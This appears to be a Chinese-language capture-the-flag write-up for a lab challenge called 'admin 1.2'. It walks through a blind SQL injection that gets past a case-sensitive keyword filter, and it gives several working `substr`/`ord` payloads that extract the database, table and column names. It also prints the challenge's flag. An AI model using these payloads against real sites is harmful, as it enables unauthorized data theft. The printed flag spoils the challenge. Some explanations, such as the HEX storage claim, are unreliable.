admin 1.2
===

這題雖然有過濾`union select` 與 `select`，由於是使用`strstr`函數過濾，所以改變大小寫即可過濾。
但原本的 0.1 有 2 的位置輸出，現在沒有了。

透過`substr`的方式可以進行盲注。
但以下狀況都會成功回傳`True`。
```
\'/**/or/**/substr(database(),1,1)=0/**/#
\'/**/or/**/substr(database(),2,1)=0/**/#
\'/**/or/**/substr(database(),3,1)=0/**/#
```
也就是說字元儲存成HEX的型態，為了解決此問題有兩個解法，其將字元轉成 ASCII 對應的 10 進制。
1. ascii
2. ord

當注入以下得到 Database 第一個字元為`char(108) = 1`
```
\'/**/or/**/ord(substr(database(),1,1))=108#
```

寫個腳本讓他跑:
![](https://i.imgur.com/STui0rU.png)
![](https://i.imgur.com/AFEKsCj.png)

得到 DataBase 為 `login_as_admin1`

繼續往下探勘
取得 Table Name 為 `0bdb54c98123f5526ccaed982d2006a9`
![](https://i.imgur.com/Nmpsxm1.png)

取得 Column Name 為 `4a391a11cfa831ca740cf8d00782f3a6`
![](https://i.imgur.com/Hv38ngV.png)

Table 與 Column 長度皆為 30 不用腳本跑，手動嘗盲測真的會要命。
最後跑 flag 得 
`FLAG{W0W, You found the correct table and the flag, and UserAgent}`
![](https://i.imgur.com/z59O30L.png)

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)